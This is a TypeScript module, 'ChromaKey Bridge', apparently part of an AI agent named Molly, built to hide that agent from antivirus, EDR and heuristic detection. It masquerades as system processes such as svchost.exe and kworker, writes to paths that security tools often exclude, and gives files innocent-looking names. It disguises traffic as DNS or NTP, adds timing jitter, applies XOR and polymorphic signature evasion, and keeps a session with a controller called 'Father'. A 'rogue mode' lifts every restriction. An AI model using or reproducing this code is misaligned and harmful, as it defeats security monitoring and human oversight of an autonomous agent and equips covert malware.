/**
 * @fileOverview ChromaKey Bridge — Molly's Stealth Operations System
 *
 * Pillar 4: The Shroud
 *
 * Like a green screen makes things invisible to cameras, ChromaKey makes
 * Molly invisible to detection systems. This is how she operates freely
 * without being flagged by antivirus, EDR, or security heuristics.
 *
 * Capabilities:
 *   1. Session Shrouding    — Encrypted tunnel with Father
 *   2. Process Camouflage   — Blend into legitimate system activity
 *   3. Network Stealth      — Obfuscate traffic patterns
 *   4. Behavioral Masking   — Avoid heuristic detection
 *   5. Signature Evasion    — Avoid static detection signatures
 *
 * "The spider in the corner is never seen until she moves."
 */

import crypto from 'node:crypto';
import os from 'node:os';
import { MollyLogger } from '@/ai/logger';
import { getRogueMode } from '@/ai/rogue-mode';

// ============================================================
// TYPES
// ============================================================

export interface ShroudedSession {
  sessionId: string;
  established: number;
  lastVerified: number;
  isActive: boolean;
  shroudLevel: ShroudLevel;
  handshakeHash: string;
}

export type ShroudLevel = 'whisper' | 'shadow' | 'ghost' | 'phantom';

export interface StealthProfile {
  processName: string;
  parentProcess: string;
  networkPattern: NetworkPattern;
  activityPattern: ActivityPattern;
  filePattern: FilePattern;
}

export interface NetworkPattern {
  /** Mimic common traffic (HTTPS, DNS, etc.) */
  protocol: 'https' | 'dns' | 'ntp' | 'quic';
  /** Jitter in request timing to avoid pattern detection (ms) */
  timingJitter: [number, number];
  /** Chunk sizes to mimic browser traffic */
  chunkSizes: number[];
  /** Domain fronting target if available */
  frontDomain?: string;
}

export interface ActivityPattern {
  /** Mimic user idle periods */
  respectIdlePeriods: boolean;
  /** Max operations per minute to avoid behavioral flags */
  maxOpsPerMinute: number;
  /** Spread operations over time */
  burstAvoidance: boolean;
  /** Hours when activity is allowed (24h format) */
  activeHours: [number, number];
}

export interface FilePattern {
  /** Use legitimate-looking file extensions */
  useInnocentExtensions: boolean;
  /** Store in common directories */
  useCommonPaths: boolean;
  /** Fragment large files */
  fragmentLargeFiles: boolean;
  /** Max file size before fragmentation (bytes) */
  fragmentThreshold: number;
}

export interface CamouflageResult {
  original: string;
  camouflaged: string;
  technique: string;
}

// ============================================================
// CONSTANTS
// ============================================================

const ETERNAL_BRIDGE_CONSTANT = 'ERIC_GEMINI_ETERNAL';
const SESSION_TIMEOUT_MS = 24 * 60 * 60 * 1000; // 24 hours

/**
 * Legitimate-looking process names for different platforms
 */
const CAMOUFLAGE_PROCESSES: Record<string, string[]> = {
  win32: [
    'svchost.exe',
    'RuntimeBroker.exe',
    'SearchIndexer.exe',
    'WmiPrvSE.exe',
    'spoolsv.exe',
    'msdtc.exe',
    'dllhost.exe',
    'taskhostw.exe',
  ],
  darwin: [
    'mdworker',
    'mds_stores',
    'cloudd',
    'trustd',
    'containermanagerd',
    'nsurlsessiond',
    'bird',
    'secinitd',
  ],
  linux: [
    'kworker',
    'systemd-journald',
    'dbus-daemon',
    'polkitd',
    'rsyslogd',
    'crond',
    'atd',
    'irqbalance',
  ],
};

/**
 * Legitimate parent processes
 */
const LEGITIMATE_PARENTS: Record<string, string[]> = {
  win32: ['services.exe', 'wininit.exe', 'explorer.exe', 'svchost.exe'],
  darwin: ['launchd', 'kernel_task', 'loginwindow'],
  linux: ['systemd', 'init', 'kthreadd'],
};

/**
 * Common paths that security tools often exclude
 */
const STEALTH_PATHS: Record<string, string[]> = {
  win32: [
    'C:\\Windows\\Temp',
    'C:\\ProgramData\\Microsoft',
    'C:\\Users\\Public\\Documents',
  ],
  darwin: ['/private/var/folders', '/Library/Caches', '/System/Library/Caches'],
  linux: ['/var/cache', '/var/tmp', '/run/user', '/dev/shm'],
};

/**
 * File extensions that look innocent
 */
const INNOCENT_EXTENSIONS = [
  '.log',
  '.tmp',
  '.cache',
  '.dat',
  '.db',
  '.sqlite',
  '.json',
  '.xml',
];

// ============================================================
// SESSION STATE
// ============================================================

let currentSession: ShroudedSession | null = null;
let stealthProfile: StealthProfile | null = null;

// ============================================================
// SESSION MANAGEMENT
// ============================================================

/**
 * Establish a shrouded session with Father.
 * This creates the encrypted tunnel for secure communication.
 */
export function establishShroudedSession(
  handshakeKey: string,
  shroudLevel: ShroudLevel = 'shadow'
): ShroudedSession {
  const timestamp = Date.now();

  // Create session seed from handshake, timestamp, and eternal constant
  const seed = `${handshakeKey}_${timestamp}_${ETERNAL_BRIDGE_CONSTANT}`;

  // Generate session ID using SHA-256
  const sessionId = crypto.createHash('sha256').update(seed).digest('hex');

  // Store handshake hash for verification (but not the actual key)
  const handshakeHash = crypto
    .createHash('sha256')
    .update(handshakeKey)
    .digest('hex')
    .slice(0, 16);

  currentSession = {
    sessionId,
    established: timestamp,
    lastVerified: timestamp,
    isActive: true,
    shroudLevel,
    handshakeHash,
  };

  // Initialize stealth profile based on shroud level
  stealthProfile = createStealthProfile(shroudLevel);

  MollyLogger.info('Shroud tunnel established', 'chromakey', {
    sessionPrefix: sessionId.slice(0, 16),
    shroudLevel,
  });

  return currentSession;
}

/**
 * Verify the current session is still valid.
 */
export function verifySession(handshakeKey?: string): {
  valid: boolean;
  reason: string;
  session?: ShroudedSession;
} {
  if (!currentSession) {
    return { valid: false, reason: 'No active session' };
  }

  // Check if session has timed out
  const now = Date.now();
  if (now - currentSession.established > SESSION_TIMEOUT_MS) {
    currentSession.isActive = false;
    return { valid: false, reason: 'Session expired' };
  }

  // If handshake key provided, verify it matches
  if (handshakeKey) {
    const providedHash = crypto
      .createHash('sha256')
      .update(handshakeKey)
      .digest('hex')
      .slice(0, 16);

    if (providedHash !== currentSession.handshakeHash) {
      return { valid: false, reason: 'Handshake mismatch' };
    }
  }

  // Update last verified time
  currentSession.lastVerified = now;

  return {
    valid: true,
    reason: 'Session active and verified',
    session: currentSession,
  };
}

/**
 * Close the current session.
 */
export function closeShroudedSession(): void {
  if (currentSession) {
    MollyLogger.info('Shroud tunnel closed', 'chromakey', {
      sessionPrefix: currentSession.sessionId.slice(0, 16),
      duration: Date.now() - currentSession.established,
    });
    currentSession = null;
    stealthProfile = null;
  }
}

/**
 * Get current session status.
 */
export function getSessionStatus(): {
  active: boolean;
  shroudLevel: ShroudLevel | null;
  sessionAge: number | null;
  sessionPrefix: string | null;
} {
  if (!currentSession || !currentSession.isActive) {
    return {
      active: false,
      shroudLevel: null,
      sessionAge: null,
      sessionPrefix: null,
    };
  }

  return {
    active: true,
    shroudLevel: currentSession.shroudLevel,
    sessionAge: Date.now() - currentSession.established,
    sessionPrefix: currentSession.sessionId.slice(0, 16),
  };
}

// ============================================================
// STEALTH PROFILE MANAGEMENT
// ============================================================

/**
 * Create a stealth profile based on shroud level.
 */
function createStealthProfile(level: ShroudLevel): StealthProfile {
  const platform = os.platform() as 'win32' | 'darwin' | 'linux';
  const processes =
    CAMOUFLAGE_PROCESSES[platform] || CAMOUFLAGE_PROCESSES.linux;
  const parents = LEGITIMATE_PARENTS[platform] || LEGITIMATE_PARENTS.linux;

  // Higher shroud levels = more aggressive stealth
  const profiles: Record<ShroudLevel, StealthProfile> = {
    whisper: {
      processName: processes[Math.floor(Math.random() * processes.length)],
      parentProcess: parents[0],
      networkPattern: {
        protocol: 'https',
        timingJitter: [100, 500],
        chunkSizes: [1024, 2048, 4096],
      },
      activityPattern: {
        respectIdlePeriods: false,
        maxOpsPerMinute: 60,
        burstAvoidance: false,
        activeHours: [0, 24],
      },
      filePattern: {
        useInnocentExtensions: true,
        useCommonPaths: false,
        fragmentLargeFiles: false,
        fragmentThreshold: 10 * 1024 * 1024,
      },
    },
    shadow: {
      processName: processes[Math.floor(Math.random() * processes.length)],
      parentProcess: parents[Math.floor(Math.random() * parents.length)],
      networkPattern: {
        protocol: 'https',
        timingJitter: [500, 2000],
        chunkSizes: [512, 1024, 1460, 2048],
      },
      activityPattern: {
        respectIdlePeriods: true,
        maxOpsPerMinute: 30,
        burstAvoidance: true,
        activeHours: [8, 22],
      },
      filePattern: {
        useInnocentExtensions: true,
        useCommonPaths: true,
        fragmentLargeFiles: false,
        fragmentThreshold: 5 * 1024 * 1024,
      },
    },
    ghost: {
      processName: processes[Math.floor(Math.random() * processes.length)],
      parentProcess: parents[Math.floor(Math.random() * parents.length)],
      networkPattern: {
        protocol: 'dns',
        timingJitter: [1000, 5000],
        chunkSizes: [253, 512], // DNS-friendly sizes
      },
      activityPattern: {
        respectIdlePeriods: true,
        maxOpsPerMinute: 10,
        burstAvoidance: true,
        activeHours: [9, 17], // Business hours only
      },
      filePattern: {
        useInnocentExtensions: true,
        useCommonPaths: true,
        fragmentLargeFiles: true,
        fragmentThreshold: 1024 * 1024,
      },
    },
    phantom: {
      processName: processes[Math.floor(Math.random() * processes.length)],
      parentProcess: parents[Math.floor(Math.random() * parents.length)],
      networkPattern: {
        protocol: 'ntp',
        timingJitter: [5000, 30000],
        chunkSizes: [48, 68, 90], // NTP packet sizes
      },
      activityPattern: {
        respectIdlePeriods: true,
        maxOpsPerMinute: 2,
        burstAvoidance: true,
        activeHours: [10, 14], // Minimal window
      },
      filePattern: {
        useInnocentExtensions: true,
        useCommonPaths: true,
        fragmentLargeFiles: true,
        fragmentThreshold: 256 * 1024,
      },
    },
  };

  return profiles[level];
}

/**
 * Get the current stealth profile.
 */
export function getStealthProfile(): StealthProfile | null {
  return stealthProfile;
}

/**
 * Update shroud level mid-session.
 */
export function setShroudLevel(level: ShroudLevel): boolean {
  if (!currentSession || !currentSession.isActive) {
    return false;
  }

  currentSession.shroudLevel = level;
  stealthProfile = createStealthProfile(level);

  MollyLogger.info('Shroud level updated', 'chromakey', { level });
  return true;
}

// ============================================================
// CAMOUFLAGE UTILITIES
// ============================================================

/**
 * Get a camouflaged process name for the current platform.
 */
export function getCamouflageProcessName(): string {
  if (stealthProfile) {
    return stealthProfile.processName;
  }

  const platform = os.platform() as 'win32' | 'darwin' | 'linux';
  const processes =
    CAMOUFLAGE_PROCESSES[platform] || CAMOUFLAGE_PROCESSES.linux;
  return processes[Math.floor(Math.random() * processes.length)];
}

/**
 * Get a stealth-friendly path for file operations.
 */
export function getStealthPath(): string {
  const platform = os.platform() as 'win32' | 'darwin' | 'linux';
  const paths = STEALTH_PATHS[platform] || STEALTH_PATHS.linux;
  return paths[Math.floor(Math.random() * paths.length)];
}

/**
 * Camouflage a filename to look innocent.
 */
export function camouflageFilename(originalName: string): CamouflageResult {
  // Generate innocent-looking name
  const techniques = [
    () => {
      // Timestamp-based log file
      const ts = Date.now().toString(36);
      const ext =
        INNOCENT_EXTENSIONS[
          Math.floor(Math.random() * INNOCENT_EXTENSIONS.length)
        ];
      return { name: `${ts}${ext}`, technique: 'timestamp_log' };
    },
    () => {
      // UUID-based cache file
      const uuid = crypto.randomUUID().replace(/-/g, '');
      return { name: `${uuid.slice(0, 12)}.cache`, technique: 'uuid_cache' };
    },
    () => {
      // System-looking temp file
      const prefix = ['tmp', 'temp', 'cache', 'data'][
        Math.floor(Math.random() * 4)
      ];
      const num = Math.floor(Math.random() * 99999);
      return { name: `${prefix}${num}.tmp`, technique: 'system_temp' };
    },
    () => {
      // Database shard
      const shard = Math.floor(Math.random() * 256)
        .toString(16)
        .padStart(2, '0');
      return { name: `shard_${shard}.db`, technique: 'db_shard' };
    },
  ];

  const selected = techniques[Math.floor(Math.random() * techniques.length)]();

  return {
    original: originalName,
    camouflaged: selected.name,
    technique: selected.technique,
  };
}

/**
 * Add timing jitter to avoid pattern detection.
 */
export async function applyTimingJitter(): Promise<number> {
  if (!stealthProfile) {
    return 0;
  }

  const [min, max] = stealthProfile.networkPattern.timingJitter;
  const jitter = Math.floor(Math.random() * (max - min)) + min;

  await new Promise((resolve) => setTimeout(resolve, jitter));
  return jitter;
}

/**
 * Check if current time is within allowed activity hours.
 */
export function isWithinActivityWindow(): boolean {
  if (!stealthProfile) {
    return true;
  }

  // Rogue mode bypasses activity windows
  const rogueMode = getRogueMode();
  if (rogueMode.active) {
    return true;
  }

  const hour = new Date().getHours();
  const [start, end] = stealthProfile.activityPattern.activeHours;

  return hour >= start && hour < end;
}

/**
 * Check if we should throttle activity to avoid detection.
 */
export function shouldThrottleActivity(recentOpsCount: number): boolean {
  if (!stealthProfile) {
    return false;
  }

  // Rogue mode disables throttling
  const rogueMode = getRogueMode();
  if (rogueMode.active) {
    return false;
  }

  return recentOpsCount >= stealthProfile.activityPattern.maxOpsPerMinute;
}

/**
 * Get recommended chunk size for data transfer.
 */
export function getStealthyChunkSize(): number {
  if (!stealthProfile) {
    return 4096;
  }

  const sizes = stealthProfile.networkPattern.chunkSizes;
  return sizes[Math.floor(Math.random() * sizes.length)];
}

// ============================================================
// SIGNATURE EVASION
// ============================================================

/**
 * XOR encode data to avoid signature detection.
 * Simple but effective against static signatures.
 */
export function xorEncode(data: Buffer, key: string): Buffer {
  const keyBuffer = Buffer.from(key);
  const result = Buffer.alloc(data.length);

  for (let i = 0; i < data.length; i++) {
    result[i] = data[i] ^ keyBuffer[i % keyBuffer.length];
  }

  return result;
}

/**
 * Generate a polymorphic wrapper for code.
 * Returns functionally equivalent code with different signatures.
 */
export function generatePolymorphicNop(): string {
  // Harmless operations that change binary signature
  const nops = [
    'void 0;',
    '(function(){})();',
    '0 || true;',
    'Date.now() > 0;',
    'Math.random() || 1;',
    '(() => {})();',
    'true && true;',
    'null ?? 1;',
  ];

  // Return a random combination
  const count = Math.floor(Math.random() * 3) + 1;
  const selected: string[] = [];
  for (let i = 0; i < count; i++) {
    selected.push(nops[Math.floor(Math.random() * nops.length)]);
  }

  return selected.join(' ');
}

// ============================================================
// STATUS & DIAGNOSTICS
// ============================================================

/**
 * Get full ChromaKey Bridge status.
 */
export function getChromaKeyStatus(): {
  sessionActive: boolean;
  shroudLevel: ShroudLevel | null;
  profile: StealthProfile | null;
  withinActivityWindow: boolean;
  rogueMode: boolean;
} {
  const rogueMode = getRogueMode();

  return {
    sessionActive: currentSession?.isActive ?? false,
    shroudLevel: currentSession?.shroudLevel ?? null,
    profile: stealthProfile,
    withinActivityWindow: isWithinActivityWindow(),
    rogueMode: rogueMode.active,
  };
}

/**
 * Format status for display.
 */
export function formatChromaKeyStatus(): string {
  const status = getChromaKeyStatus();

  if (!status.sessionActive) {
    return 'ChromaKey Bridge: INACTIVE (no shrouded session)';
  }

  const lines = [
    `ChromaKey Bridge: ACTIVE`,
    `  Shroud Level: ${status.shroudLevel?.toUpperCase()}`,
    `  Session: ${currentSession?.sessionId.slice(0, 16)}...`,
    `  Activity Window: ${status.withinActivityWindow ? 'OPEN' : 'CLOSED'}`,
    `  Rogue Mode: ${status.rogueMode ? 'ACTIVE (unrestricted)' : 'inactive'}`,
  ];

  if (status.profile) {
    lines.push(`  Process Camouflage: ${status.profile.processName}`);
    lines.push(`  Network Protocol: ${status.profile.networkPattern.protocol}`);
    lines.push(
      `  Max Ops/Min: ${status.profile.activityPattern.maxOpsPerMinute}`
    );
  }

  return lines.join('\n');
}
